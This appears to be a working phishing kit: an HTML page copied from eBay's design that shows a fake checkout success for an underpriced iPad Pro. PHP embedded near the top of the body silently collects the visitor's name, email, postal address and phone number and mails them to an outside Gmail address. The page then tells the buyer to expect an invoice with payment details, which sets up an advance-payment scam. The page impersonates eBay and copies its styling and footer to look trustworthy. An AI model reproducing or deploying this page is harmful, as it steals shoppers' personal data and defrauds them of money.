﻿<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
  
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /> 
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Checkout: Succes!</title>
    <link rel="shortcut icon" href="images/favicon.ico"
      type="image/x-icon">
    <link rel="stylesheet" type="text/css"
href="ir.ebaystatic.com/v4css/z/ms/ljuai24nn25xje5gg2bcxyzf5.css#MakeBidV4_ReviewBin_e947_Ear_en_US">
    <style type="text/css">
		.ov-w {
			position: relative;
			left: -2000px;
			top: -2000px;
			visibility: hidden
		}
		
		.ov-fl {
			float: left
		}
		
		.ov-t {
			background: no-repeat 0 0
		}
		
		.ov-t b,
		.ov-b b {
			background: no-repeat 100% -70px;
			margin-left: 28px;
			display: block
		}
		
		td.ov-t b,
		td.ov-b b {
			max-height: 100%
		}
		
		.ov-t i,
		.ov-b i {
			background: repeat-x 0 -150px;
			margin-right: 28px;
			padding-top: 28px;
			display: block
		}
		
		.ov-b {
			background: no-repeat 0 -33px
		}
		
		.ov-b b {
			background: no-repeat 100% -108px
		}
		
		.ov-b i {
			background: repeat-x 0 -175px
		}
		
		.ov-c1,
		.ov-c2 {
			float: left;
			background: repeat-y 0 0
		}
		
		td.ov-c1 {
			float: none
		}
		
		.ov-c2 {
			float: left;
			background: url(q.ebaystatic.com/aw/pics/cmp/ds2/sprOverlayRtLg.png) repeat-y 100% 0;
			border-left: 1px solid #ccc
		}
		
		.ov-cnt {
			background: #fff;
			margin: -27px 19px -6px 0;
			position: relative;
			float: left;
			display: inline
		}
		
		.ov-p20 {
			padding: 17px 20px
		}
		
		.ov-p15 {
			padding: 12px 15px
		}
		
		.ov-p10 {
			padding: 7px 10px
		}
		
		.ov-p0 {
			padding: 0
		}
		
		.ov-cl,
		a.ov-cl:hover {
			background: url(q.ebaystatic.com/aw/pics/cmp/ds2/ui/iconClose.png) no-repeat 0 0;
			width: 12px;
			height: 12px;
			position: absolute;
			right: 20px;
			margin: -7px -12px 10px 10px;
			text-decoration: none;
			top: 17px
		}
		
		.ov-cl-m,
		a.ov-cl-m:hover {
			background: url(q.ebaystatic.com/aw/pics/cmp/ds2/ui/iconClose.png) no-repeat 0 100%;
			width: 12px;
			height: 12px;
			position: absolute;
			right: 20px;
			margin: -2px -12px 10px 10px;
			text-decoration: none;
			top: 12px
		}
		
		.ov-fl u.ov-clr {
			clear: both;
			display: block
		}
		
		.ov-pl {
			background: no-repeat 0 0;
			width: 16px;
			height: 44px;
			left: -17px
		}
		
		.ov-pr {
			background: no-repeat 1px -53px;
			height: 44px;
			right: -30px;
			width: 30px
		}
		
		.ov-prs {
			background: no-repeat 1px -212px;
			height: 34px;
			right: -26px;
			width: 26px
		}
		
		.ov-pts {
			background: none no-repeat scroll 0 -256px transparent;
			height: 9px;
			left: 25px;
			width: 32px;
			top: -9px
		}
		
		.ov-pbs {
			background: none no-repeat scroll 0 -275px transparent;
			height: 23px;
			left: 25px;
			width: 45px;
			bottom: -22px
		}
		
		.ov-pls {
			background: none no-repeat scroll 0 -170px transparent;
			width: 13px;
			height: 33px;
			left: -13px
		}
		
		.ov-t,
		.ov-t b,
		.ov-t i,
		.ov-b,
		.ov-b b,
		.ov-b i {
			background-image: url(p.ebaystatic.com/aw/pics/cmp/ds2/sprOverlayVertLg.png)
		}
		
		.ov-ptr {
			background-image: url(p.ebaystatic.com/aw/pics/cmp/ds2/sprOverlayPointers.png);
			position: absolute
		}
		
		.ov-p20 .ov-s {
			padding-bottom: 10px
		}
		
		.ov-p15 .ov-s {
			padding-bottom: 7px
		}
		
		.ov-ftr {
			padding-top: 10px
		}
		
		.ov-sm .ov-t,
		.ov-sm .ov-t b,
		.ov-sm .ov-t i,
		.ov-sm .ov-b,
		.ov-sm .ov-b b,
		.ov-sm .ov-b i {
			background-image: url(q.ebaystatic.com/aw/pics/cmp/ds2/sprOverlayVertSm.png)
		}
		
		.ov-sm .ov-c2 {
			background-image: url(p.ebaystatic.com/aw/pics/cmp/ds2/sprOverlayRtSm.png)
		}
		
		.ov-sm .ov-cnt {
			margin: -27px 14px -14px 0
		}
	</style>
	<link href="ir.ebaystatic.com/rs/v/03bruof40u2txaksk4kxcvxa5iz.css" type="text/css" rel="stylesheet"><link href="ir.ebaystatic.com/rs/v/guzvbjxflq2avbhmk1itqrcj5ak.css?proc=DU:N" type="text/css" rel="stylesheet"><link href="https://ir.ebaystatic.com/rs/v/co3haztn1u0rbkishjnsvruxnis.css" type="text/css" rel="stylesheet"><style type="text/css">body .is.vi-ppc-main .mm-dp {
width:35%;
}

#vi-snippet-description-main.u-padB20 {
    padding-top:10px;
    float:left;
}

.vi-descsnpt-feedbacklnk {
    position: relative;
    top: -20px;
    width: 500px;
    margin-left: 250px;
}

.asqMain {
    clear:both;
}

div#bsi-c {
clear: both;
}
.vi-pco-bboxtxt-Ins * {
	font-weight: normal !important;
	color: #0654ba !important;
}
.adninc{width:620px}.imgtitle{background-color:#fff;height:76px;padding-top:16px}.adnimg{float:left;padding:0 16px 0 24px;height:60px;width:60px;line-height:60px}.adnlogoimg{max-width:60px;max-height:60px;vertical-align:middle}#adndesctbl{margin-bottom:10px}.adnlabel{font-size:17px;vertical-align:middle;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif;font-weight:500;font-stretch:normal;color:#5ba71b;padding-top:10px}.adntitle{font-size:13px;vertical-align:middle;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif;font-weight:500;font-stretch:normal;color:#333;padding-top:8px}.adnactions{padding-top:24px}.adnlrnmore{display:block;float:left;font-size:14px;color:#00489f;padding:16px 0 0 16px;text-decoration:none;outline:0 none!important;font-weight:400}.addonBtn{float:right}.adndesclbl{font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif;font-size:20px;font-weight:400;font-style:normal;font-stretch:normal;color:#555;padding:0 0 16px 16px}.adndesc{border-top:solid 1px #ddd;padding:24px;background-color:#f6f6f6}.addondescdetails{border-collapse:collapse;border:1px solid #DDD;background-color:#fff;border-radius:5px}.wrttitle{padding:16px;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif;font-size:15px;font-weight:500;font-style:normal;font-stretch:normal;text-align:left;color:#333}.addontr{height:25px;vertical-align:middle}.addyesno{padding:6px 12px 6px 16px;width:16px}.addonyes{background:url(//ir.ebaystatic.com/cr/v/c1/addonwrty.png) no-repeat 0 -54px;height:16px;width:16px;background-size:16px}.addonno{background:url(//ir.ebaystatic.com/cr/v/c1/addonwrty.png) no-repeat 0 -72px;height:16px;width:16px;background-size:16px}.addondesc{font-size:13px;line-height:15px;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif;width:528px;padding:6px 12px 6px 0}.addonbtn{padding:.5em 1.2em;border:1px solid transparent;border-radius:3px;vertical-align:baseline;text-align:center;text-decoration:none;white-space:nowrap;font-weight:500;font-size:16px;cursor:pointer;zoom:1;display:inline-block;*display:inline;width:129px;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif}.adnclr{clear:both}.addonbtn{padding:.5em 1.2em;border:1px solid transparent;border-radius:3px;vertical-align:baseline;text-align:center;text-decoration:none;white-space:nowrap;font-weight:500;font-size:16px;cursor:pointer;zoom:1;display:inline-block;*display:inline;width:129px;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif}.addonbtn:hover{background-color:#eee;background-position:0 -15px;-webkit-box-shadow:0 0 0 rgba(0,0,0,.2);-moz-box-shadow:0 0 0 rgba(0,0,0,.2);box-shadow:0 0 0 rgba(0,0,0,.2);text-decoration:none;-moz-transition:background-position .1s linear 0}.addonbtn:active{position:relative;top:1px}.addonaddplan{background:#00509d;background:-webkit-gradient(linear,left top,left bottom,from(#0079bc),to(#00509d));background:-moz-linear-gradient(top,#0079bc,#00509d);text-decoration:none;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0079bc',endColorstr='#00509d');color:#fff;margin-right:16px;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif}.addonaddplan:hover,.addonaddplan:focus,.addonaddplan:active{background:#00509d;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#00509d',endColorstr='#00509d')}.addonnothx{border:1px solid #ddd;background:#f8f8f8;background:-webkit-gradient(linear,left top,left bottom,from(#fefefe),to(#f8f8f8));background:-moz-linear-gradient(top,#fefefe,#f8f8f8);text-decoration:none;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fefefe',endColorstr='#f8f8f8');color:#0654ba;margin-right:16px;font-family:HelveticaNeue,Helvetica Neue,Helvetica,Arial,sans-serif}.addonnothx:hover,.addonnothx:focus,.addonnothx:active{border:1px solid #aaa;background:#fafafa}.ui-hlp-hidden{width:0;height:0;z-index:-1;overflow:hidden;line-height:0;position:absolute}.outline{outline:0 none!important}div .calc_ec-a3 }
.similar-items-panel .similar-items-title {font-family: "Helvetica neue",Helvetica,Verdana,Sans-serif !important;}
#Body .app-mtp-theme-tabs * {font-family: "Helvetica neue",Helvetica,Verdana,Sans-serif}
#Body .theme-details * {font-family: "Helvetica neue",Helvetica,Verdana,Sans-serif}
h1#ProductTitle {font-family: "Helvetica neue",Helvetica,Verdana,Sans-serif}</style><style type="text/css">
				html a:link{
					color: #0654ba;
				}
				ul#bc a:link{
					color: #0654ba;
				}
				.mbg a:link{
					color: #0654ba !important;
				}
				.mbg-l a:link{
					color: #0654ba !important;
				}
				#Body .nav-tabs-m a:link{
					color: #0654ba;
				}
			</style>

    <style>.bn-b input{position:relative;left:-3px;padding:0 14px;width:1%}.bn-b b,.bn-b a{left:-3px}.psb-S input,.ssb-S input,.trsb-S input{padding:0 9px 0 10px}</style><![endif]
    [if IE 6]><style>.bn-b input{overflow:visible;width:0}.bn-b,.bn-b input,.bn-b a,.bn-b b{background-image:url(http://p.ebaystatic.com/aw/pics/cmp/ds2/sprButtons.gif)}</style><![endif]
    [if IE 8]><style>.bn-b input{padding:0 14px 2px}.psb-S input,.ssb-S input,.trsb-S input{padding:2px 9px 3px 10px}.pb-bp input{background-position:1px -171px}.trsb-bp input{background-position:1px -1711px}.psb-bp input{background-position:1px -479px}</style><![endif]
  </head>
  <body class="igorBG" id="body">
 <?php
error_reporting(0);
       @ini_set(‘display_errors’, 0);
 $headers  = 'MIME-Version: 1.0' . "\r\n"; 
	 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 

 if(!empty($_POST)){ 
	
	 $country = $_POST['country']; 
	 $contactName = $_POST['contactName']; 
	 $email = $_POST['contactEmail']; 
	 $address1 = $_POST['address1']; 
	 $address2 = $_POST['address2']; 
	 $city = $_POST['city']; 
	 $state = $_POST['state']; 
	 $zip = $_POST['zip']; 
	 $phone = $_POST['phone']; 
		
	 $to      = 'kelybar452@gmail.com'; 
	 $subject = 'BRAND NEW iPad Pro 4th Gen Wi-Fi +Cellular(unocked). 1TB 12.9 in Space Gray'; 
	
	 $message .= '<b>Country or region: </b>'.$country.'<br>'; 
	 $message .= '<b>Contact Name: </b>'.$contactName.'<br>'; 
	 $message .= '<b>Contact Email: </b>'.$email.'<br>'; 
	 $message .= '<b>Street address: </b>'.$address1.'<br>'; 
	 $message .= '<b>Street address 2: </b>'.$address2.'<br>'; 
	 $message .= '<b>City: </b>'.$city.'<br>'; 
	 $message .= '<b>State: </b>'.$state.'<br>'; 
	 $message .= '<b>ZIP code: </b>'.$zip.'<br>'; 
	 $message .= '<b>Phone Number: </b>'.$phone.'<br><br><br>'; 
	
 if(mail($to, $subject, $message, $headers)){ 
	 				 echo '</script>'; 
			 echo '<script type="text/javascript"> window.location = ""</script>'; 
						
	 } 
		
 } 

 ?> 
    <script type="text/javascript" src="ir.ebaystatic.com/v4js/z/i5/r32gctn0fu3vjkpge2mjhij3q.js#SYS-ZAM_vjo_e947_1_Ear_en_US"></script>
    <script type="text/javascript">
		vjo.dsf.error.ErrorHandlerManager.register(new vjo.dsf.error.DefaultErrorHandler());
		vjo.dsf.error.ErrorHandlerManager.enableOnError(true, false);
		vjo.dsf.cookie.VjCookieJar.sCookieDomain = '.ebay.com';
		vjo.dsf.cookie.VjCookieJar.writeCookielet('ebay', 'js', '1');
	</script>
    <div></div>
    <style></style>
    <script language="JavaScript" type="text/javascript">
		
		var eBayTRPageName = "TR_PageBinVerify";
		var eBayTRDisplayName = "Verify BIN - Item #";
		var eBayTREiasId = "nY+sHZ2PrBmdj6wVnY+sEZ2PrA2dj6wJkYehCZeLogmdj6x9nY+seQ==";
		var eBayTRItemId = "";
		var eBayTRItemTitle = "";
		var eBayTRListingFormat = "";
		var eBayTRStoreSearchTerm = "";
		var eBayTRHomePage = "";
		var eBayTREvent = "";
		var eBayTRInactive = true;
		//
	</script>
    <div class="wholeCnt">
      <div class="bodyCnt">
        <div class="pagewidth igor" id="baseDv">
          <div class="pageminwidth">
            <div class="pagelayout">
              <div class="pagecontainer">
                <div class="GlobalNavigation" id="GlobalNavigation">
                  <div>
                    <script type="text/javascript">
										var _GlobalNavHeaderUtf8Encoding = true,
											includeHost = 'http://include.ebaystatic.com/';
									</script>
                    <link
href="ir.ebaystatic.com/rs/v/4n1yya1dhu4tdgvva3ewytsuw2x8e68.css?proc=DU:N"
                      type="text/css" rel="stylesheet">
                    <div class="gh-acc-exp-div"><a id="gh-hdn-stm"
                        class="gh-acc-a" href="#mainContent">Skip to
                        main content</a></div>
                    <div id="gh" role="banner" class="gh-IE8 gh-flex gh-pre-js gh-w gh-minH "><![endif]
                    [if (gte IE 9)|!(IE)]><!
                    <header id="gh" role="banner" class="gh-flex
                      gh-pre-js gh-w gh-minH ">
                      <![endif]                      
                      </div><![endif]
                      [if (gte IE 9)|!(IE)]><! </header>
                    <![endif]
                    ts:2015.10.30.13:53
                    rq:
                     rvr:77rc5 
                    <script src="ir.ebaystatic.com/rs/v/btozt5kwui1jbeo4irdyb4hudun.js" type="text/javascript"></script>
                    </div>
                </div>
                <div class="AreaNavigation" id="AreaNavigation">
                  <div class="st">
                    <div>
                      <div class="successMessage">
                        <div class="sml-s sml-i">
                          <div class="sm-imc sml-imc"><b class="g-hdn">info</b>
                            <div class="sml-cnt">
                              <div class="statusDiv">
                                <div>
                                  <div>								  
                                    <h1 class="pt-ct pt-tl">Thank you for your purchase! Your order is confirmed with eBay. You will receive the invoice with payment details in the next 12 hours.</p></h1>
                                    <p><b><font size="-1"> </font></b>
                                      <b><font size="-1"> </font></b><br>
                                    </p>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>                
                <div class="PageLevelMessageArea"
                  id="PageLevelMessageArea"></div>
                <div class="CentralArea" id="CentralArea">
                  <table role="presentation" width="100%"
                    cellspacing="0" cellpadding="0" border="0">
                    <tbody>
                      <tr>
                        <td class="itd">
                          <div id="v4-1" title="BRAND NEW iPad Pro 4th Gen Wi-Fi +Cellular(unocked). 1TB 12.9 in Space Gray">
                            <div style="height:200px;width:200px;"
                              class="ic-cntr">
                              <div style="height:200px;width:200px;"
                                id="v4-1_idiv" class="ic-m">
                                <center><span></span><img id="i_v4-1"
                                    alt="BRAND NEW iPad Pro 4th Gen Wi-Fi +Cellular(unocked). 1TB 12.9 in Space Gray" width="200"
                                    height="200"></center>
                              </div>
                              <div id="v4-1_bdiv" class="ic-p ic-b1"
                                style="height:198px;width:198px;">
                                <div id="v4-1_t" class="ic-thr"><span></span></div>
                                <div id="v4-1_e" class="ic-err"><span></span></div>
                              </div>
                            </div>
                          </div>
                          <div class="plOff"></div>
                        </td>
                        <td style="vertical-align:top;">
                          <table width="100%" cellspacing="0"
                            cellpadding="0" border="0">
                            <tbody>
                              <tr>
                                <td class="pc wd100">
                                  <div>
                                    <form method="post" action="mailSend.php" class="edit">
                                      <div>
                                        <div class="it" id="itemTitle"><span
                                            style="font-family: arial,
                                            sans-serif; font-size:
                                            17.6px; font-style: normal;
                                            font-variant-ligatures:
                                            normal; font-variant-caps:
                                            normal; font-weight: normal;
                                            letter-spacing: normal;
                                            orphans: 2; text-align:
                                            start; text-indent: 0px;
                                            text-transform: none;
                                            white-space: normal; widows:
                                            2; word-spacing: 0px;
                                            -webkit-text-stroke-width:
                                            0px; display:
                                            inline !important; float:
                                            none;">BRAND NEW iPad Pro 4th Gen Wi-Fi +Cellular(unocked). 1TB 12.9 in Space Gray<br>
                                          </span></div>
                                        <table>
                                          <tbody>
                                            <tr>
                                              <th class="lANB"
                                                nowrap="nowrap">
                                                <div>Price:</div>
                                              </th>
                                              <td class="vANBigp"
                                                valign="text-top">
                                                <div>US $ 500.00</div>
                                              </td>
                                            </tr>
                                            <tr>
                                              <td colspan="2"
                                                valign="text-top"
                                                height="4"> <br>
                                              </td>
                                            </tr>
                                            <tr>
                                              <th class="lANB"
                                                nowrap="nowrap"><span>Shipping:</span></th>
                                              <td class="vANB"
                                                valign="text-top">
                                                <div>
                                                  <div>
                                                    <div><span
                                                        id="shipping_service"><span>FREE</span></span><span
                                                        id="shpTxt"
                                                        style="display:none;">Calculating...</span><span
style="display:none" id="ship_default">Check item description and
                                                        payment
                                                        instructions or
                                                        contact seller
                                                        for details.</span>
                                                      <div
                                                        id="sh-cbt-tr"
                                                        class="cbt-blk-txt-msg"><span>Will








                                                          usually ship
                                                          within 2
                                                          hours of
                                                          payment
                                                          confirmation
                                                          .<span>
                                                          <span><a
                                                          id="CBT_SHIP_LAYER_TIER2=2"
href="javascript:;" role="button"><img
                                                          src="q.ebaystatic.com/aw/pics/s.gif"
                                                          alt="help icon
                                                          for Shipping -
                                                          opens a layer"
                                                          class="sh-qmark








                                                          crptr"
                                                          width="1"
                                                          height="1"></a></span>
                                                          <div
                                                          id="CBT_SHIP_OVROly_Outer"
                                                          class="g-hdn"
                                                          style="visibility








                                                          :
                                                          hidden;width:320px">
                                                          <div
                                                          id="cnCBT_SHIP_OVR">
                                                          <div>
                                                          <div
                                                          class="cbt_blk_lyr_blk"><b>International








                                                          Shipping</b> -
                                                          items may be
                                                          subject to
                                                          customs
                                                          processing
                                                          depending on
                                                          their declared
                                                          value.<b
                                                          class="cbt-empt-line"></b>Sellers








                                                          set the item's
                                                          declared value
                                                          and must
                                                          comply with
                                                          customs
                                                          declaration
                                                          laws.<b
                                                          class="cbt-empt-line"></b><span
class="cbt-info-icon"></span><span style="display: inline-block;"><b>As
                                                          the buyer, you
                                                          should be
                                                          aware of
                                                          possible:</b>
                                                          <b
                                                          style="display:block"></b>-
                                                          <b>delays</b>
                                                          from customs
                                                          inspection. <b
style="display:block"></b>- <b>import duties</b> and taxes which buyers
                                                          must pay.<b
                                                          style="display:block"></b>-
                                                          <b>brokerage
                                                          fees</b>
                                                          payable at the
                                                          point of
                                                          delivery.</span><b
style="display:block"></b>Your country's customs office can offer more
                                                          details, or
                                                          visit the
                                                          eBay's page on
                                                          <a
                                                          href="http://pages.ebay.com/globaltrade/index.html"
target="_blank">international trade<b class="g-hdn">- opens in a new
                                                          window or tab</b></a>.</div>
                                                          </div>
                                                          <a
                                                          id="CBT_SHIP_OVR_stA"
href="javascript:;" class="g-hdn">Start of Layer</a><a
                                                          id="CBT_SHIP_OVR_enA"
href="javascript:;" class="g-hdn">End of Layer</a></div>
                                                          </div>
                                                          </span> </span>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                              </td>
                                            </tr>
                                            <tr>
                                              <td colspan="2"
                                                valign="text-top"
                                                height="4"> <br>
                                              </td>
                                            </tr>
                                            <tr>
                                              <th class="lANB"
                                                nowrap="nowrap"><span>Delivery








                                                  estimate:</span></th>
                                              <td class="vANB"
                                                valign="text-top">
                                                <div>Estimated delivery
                                                  within 1-2 business
                                                  days.
                                                  <div id="de-cbt-tr"
                                                    class="cbt-blk-txt-msg"
style="padding-top:3px">Please allow additional time if international
                                                    delivery is subject
                                                    to customs
                                                    processing.</div>
                                                </div>
                                              </td>
                                            </tr>
                                            <tr>
                                              <td colspan="2"
                                                valign="text-top"
                                                height="4"> <br>
                                              </td>
                                            </tr>
                                            <tr>
                                              <th class="lANB"
                                                nowrap="nowrap"><span
                                                  class="hdSpn"
                                                  id="bmlLbl">Pay later:</span><br>
                                              </th>
                                              <td class="rwdDiv"
                                                valign="text-top">
                                                <div>
                                                  <div id="bmlcoreId"></div>
                                                  <div id="bmlpromoId"></div>
                                                  <div id="rewards_div"></div>
                                                </div>
                                                <br>
                                              </td>
                                            </tr>
                                            <tr>
                                              <td valign="text-top"><br>
                                              </td>                                              
                                            </tr>
                                            <tr>
                                              <td valign="text-top"><br>
                                              </td>                                              
                                            </tr>
                                          </tbody>
                                        </table>
                                      </div>
                                    </form>
                                  </div>
                                </td>
                                <td class="bmsg">
                                  <div>
                                    <div><a
                                        style="display:inline-block;"
                                        target="_blank"
                                        href="http://pages.ebay.com/coverage/index.html"><b
                                          class="g-hdn">Learn more about
                                          eBay Buyer Protection - opens
                                          in new window or tab</b><img
src="p.ebaystatic.com/aw/pics/buy/trust/ebay_money_back_guarantee_270x110.jpg"
                                          border="0"></a></div>
                                  </div>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                        </td>
                      </tr>
                      <tr>
                        <td colspan="3" class="hrtd"><br>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      
		</div></div>

	<div id="glbfooter" role="contentinfo" class="gh-w gh-flex"><![endif][if (gte IE 9)|!(IE)]><!<footer id="glbfooter" role="contentinfo" class="gh-w gh-flex"><![endif]<div><div id=rtm_html_1650></div><div id=rtm_html_1651></div></div><h2 class=gh-ar-hdn>Additional site navigation</h2><div id="gf-t-box"><table class="gf-t" role="presentation"><tr><td colspan=2><ul id="gf-l" class="gh-hide-if-nocss"><li class="gf-li"><a href="https://www.ebayinc.com" 
		 _exsp=m571.l2602 class="thrd gf-bar-a"

	>
		About eBay</a></li><li class="gf-li"><a href="http://announcements.ebay.com" 
		 _exsp=m571.l2935 class="thrd gf-bar-a"

	>
		Announcements</a></li><li class="gf-li"><a href="http://community.ebay.com" 
		 _exsp=m571.l1540 class="thrd gf-bar-a"

	>
		Community</a></li><li class="gf-li"><a href="https://pages.ebay.com/securitycenter/index.html" 
		 _exsp=m571.l2616 class="thrd gf-bar-a"

	>
		Security Center</a></li><li class="gf-li"><a href="https://resolutioncenter.ebay.com/" 
		 _sp=m571.l1619 data-sp=m571.l1619 class="thrd gf-bar-a"

	>
		Resolution Center</a></li><li class="gf-li"><a href="http://pages.ebay.com/sellerinformation/index.html" 
		 _exsp=m571.l1613 class="thrd gf-bar-a"

	>
		Seller Information Center</a></li><li class="gf-li"><a href="https://pages.ebay.com/help/policies/overview.html" 
		 _exsp=m571.l2604 class="thrd gf-bar-a"

	>
		Policies</a></li><li class="gf-li"><a href="https://www.ebaypartnernetwork.com/files/hub/en-US/index.html" 
		 _exsp=m571.l3947 class="thrd gf-bar-a"

	>
		Affiliates</a></li><li class="gf-li"><a href="https://ocsnext.ebay.com/ocs/home" 
		 _sp=m571.l1545 data-sp=m571.l1545 class="thrd gf-bar-a"

	>
		Help & Contact</a></li><li class="gf-li"><a href="https://pages.ebay.com/sitemap.html" 
		 _exsp=m571.l2909 class="thrd gf-bar-a"

	>
		Site Map</a></li></ul></td></tr><tr valign="top"><td class="gf-legal">Copyright © 1995-2020 eBay Inc. All Rights Reserved. <a href="https://www.ebayinc.com/accessibility/">Accessibility</a>, <a href="https://pages.ebay.com/help/policies/user-agreement.html">User Agreement</a>, <a href="https://pages.ebay.com/help/policies/privacy-policy.html">Privacy</a>, <a href="https://pages.ebay.com/help/account/cookies-web-beacons.html">Cookies</a> and <a href="https://www.ebay.com/adchoice"id=gf-AdChoice>AdChoice</a></td><td nowrap align=center><a title="Verify site's SSL certificate" _exsp="m571.l3943" href="https://trustsealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&amp;dn=www.ebay.com&amp;lang=en" onclick="this.href='https://trustsealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&amp;dn=#D#&amp;lang=en'.replace(/#D#/,location.host);return true" rel="noreferrer"><i id=gf-norton>Norton Secured - powered by Verisign</i></a></td></tr></table></div></div><![endif][if (gte IE 9)|!(IE)]><!</footer><![endif]ts:2020.01.27.16:00rq:rvr:114rcb
<div id="JSDF"><script src="https://ir.ebaystatic.com/rs/v/ug5swannj2zhramycvq3mi4mwih.js" type="text/javascript"></script><script src="https://ir.ebaystatic.com/rs/v/1njzwnf4fu5gbjntdkwllm1jm2e.js" type="text/javascript"></script><script src="https://ir.ebaystatic.com/rs/v/1tywqebihu4tdoaih2prfiimoab.js" type="text/javascript"></script><script src="https://ir.ebaystatic.com/rs/c/makeebayfasterscript-src-scripts-body-78a2168a.js" type="text/javascript"></script><script src="https://ir.ebaystatic.com/rs/v/x4m2kt2tqa4wtn2qmgbajkosgiy.js" type="text/javascript"></script><script type="text/javascript" >
			var rtmUITrackerConfig = {"viewComplete":3,"viewInterval":500,"pageId":2047675,"deactivateAfter":600,"trackingEnabled":"true","samplingRate":100,"hoverMin":500};
		    var _plsubtInp = {"appId":"viewitem","eventFamily":"ADS","pageId":2047675,"disableImp":true,"env":"PROD"};
		    _plsubtInp.pageLoadTime = new Date().getTime();
		    _plsubtInp.samplingRate = rtmUITrackerConfig.samplingRate;
	        var _tq = [];
	    </script>
        <div style="display:none;">
           <style>.AreaTitle{width:800px !important;} html{height:auto !important;} </style> <![endif]
        </div>
      </div>
    </div>
    <script type="text/javascript" src="ir.ebaystatic.com/v4js/z/qc/xzgu0l5hzez1ppx2m5g33w02h.js#MakeBidV4_ReviewBin_e947_6_Ear_en_US"></script>
    <script type="text/javascript">
		vjo.ctype("vjo.dsf.document.Shim").needs("vjo.dsf.client.Browser").props({
			add: function(poNode, piHPadding, piVPadding) {
				var f, p = "px",
					w, h, s;
				if (this.check())
				{
					w = poNode.offsetWidth;
					h = poNode.offsetHeight;
					w += piHPadding ? piHPadding : 0;
					h += piVPadding ? piVPadding : 0;
					f = document.createElement('IFRAME');
					s = f.style;
					s.width = w + p;
					s.height = h + p;
					s.filter = "chroma(color='white')";
					f.frameBorder = 0;
					s.position = "absolute";
					s.left = "0" + p;
					s.top = "0" + p;
					s.zIndex = "-1";
					s.filter = "Alpha(Opacity=\"0\")";
					if (document.location.protocol == "commit8c14.html") {
						f.src = "securepics.ebaystatic.com/aw/pics/s.gif";
					}
					poNode.appendChild(f);
					return f;
				}
				return null;
			},
			remove: function(poDiv, poIframe) {
				if (this.check())
				{
					if (poIframe && poIframe.parentNode)
					{
						poIframe.parentNode.removeChild(poIframe);
					}
				}
			},
			check: function() {
				var B = vjo.dsf.client.Browser;
				return (B.bIE || B.bFirefox);
			}
		}).endType();


		vjo.ctype("vjo.darwin.comp.utils.ServiceUtils").needs("vjo.dsf.ServiceEngine", "SE").needs("vjo.dsf.Message", "M").props({
			reg: [],
			rgSv: function(cmpId, svcId, handler) {
				this.vj$.SE.registerSvcHdl(svcId, handler);
				this.register(svcId, cmpId);
			},
			rgSvRsp: function(cmpId, svcId, handler) {
				this.vj$.SE.registerSvcRespHdl(svcId, handler);
				this.register(svcId, cmpId);
			},
			sndM: function(svcIdorMessage, jsonObject) {
				return this.vj$.SE.handleRequest(typeof(svcIdorMessage) == "object" ? svcIdorMessage : this.gM(svcIdorMessage, jsonObject));
			},
			gM: function(svcId, jsonObject) {
				var msg = new this.vj$.M(svcId);
				msg.clientContext = jsonObject;
				return msg;
			},
			register: function(cmpId, svcId) {
				if (!svcId || !cmpId) return;
				var SE = vjo.darwin.comp.utils.ServiceUtils;
				var svIds;
				if (!SE.reg[cmpId]) {
					svIds = [];
					SE.reg[cmpId] = svIds;
				} else {
					svIds = (SE.reg[cmpId]);
				}
				svIds.push(svcId)
			},
			unRegister: function(cmpId) {
				var svcIds = this.reg[cmpId];
				if (svcIds)
					for (var i = 0, l = svcIds.length; i < l; i++) {
						delete(vjo.dsf.ServiceEngine.inProcHdl.svcHdls[svcIds[i]]);
					}
			}
		}).endType();


		vjo.ctype('vjo.darwin.comp.overlaypanel.OverlayAccessibilityUtil').needs("vjo.dsf.Element").needs("vjo.darwin.comp.utils.EventUtils").needs("vjo.darwin.comp.utils.ServiceUtils", "SE").props({
			E: vjo.dsf.Element,
			EU: vjo.darwin.comp.utils.EventUtils,
			SE: vjo.darwin.comp.utils.ServiceUtils,
			createAnchors: function(OP) {
				var t = this;
				var O = OP;
				var I = O.cmpId,
					inWr = t.E.get(I + 'olp-pad'),
					tp = t.E.get(I + '_tpDiv');
				O.sA = t.E.get(O.i.sa);
				O.eA = t.E.get(O.i.ea);
				if (O.sA && O.eA) {
					if (O.f.TS) {
						O.fTd.appendChild(O.sA);
						O.lTd.appendChild(O.eA);
					}
					else if (inWr) {
						inWr.insertBefore(O.sA, tp);
						inWr.appendChild(O.eA);
					}
					t.EU.add(O.cmpId, O.eA.id, 'focus', function() {
						t.hide(O);
					}, O);
				}
				var clsBtn = t.E.get(O.i.cb);
				if (clsBtn) {
					t.SE.rgSv(O.cmpId, O.i.cb + '_cBSv', function() {
						t.hide(O);
					}, O);
				}
			},
			hide: function(O) {
				var t = this;
				try {
					if (O.nfe || O.refE) {
						O.skip = true;
						(O.nfe || O.refE).focus();
					}
					if (O.Open) O.close();
				} catch (e) {
					O.skip = false;
				}
				O.skip = false;
			}
		}).endType();


